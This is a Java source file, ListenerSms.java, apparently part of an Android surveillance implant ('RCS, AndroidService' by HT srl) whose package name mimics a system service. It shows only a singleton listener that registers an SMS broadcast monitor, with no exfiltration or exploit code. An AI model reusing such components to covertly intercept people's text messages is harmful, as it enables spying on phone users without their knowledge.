/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : ListenerSms.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.listener;

import com.android.service.module.message.Sms;

public class ListenerSms extends Listener<Sms> {
	/** The Constant TAG. */
	private static final String TAG = "ListenerSms"; //$NON-NLS-1$

	private BroadcastMonitorSms smsReceiver;

	/** The singleton. */
	private volatile static ListenerSms singleton;

	/**
	 * Self.
	 * 
	 * @return the status
	 */
	public static ListenerSms self() {
		if (singleton == null) {
			synchronized (ListenerSms.class) {
				if (singleton == null) {
					singleton = new ListenerSms();
				}
			}
		}

		return singleton;
	}

	@Override
	protected void start() {
		registerSms();
	}

	@Override
	protected void stop() {

	}

	/**
	 * Register the SMS monitor.
	 */
	private void registerSms() {
		smsReceiver = new BroadcastMonitorSms();
	}
}
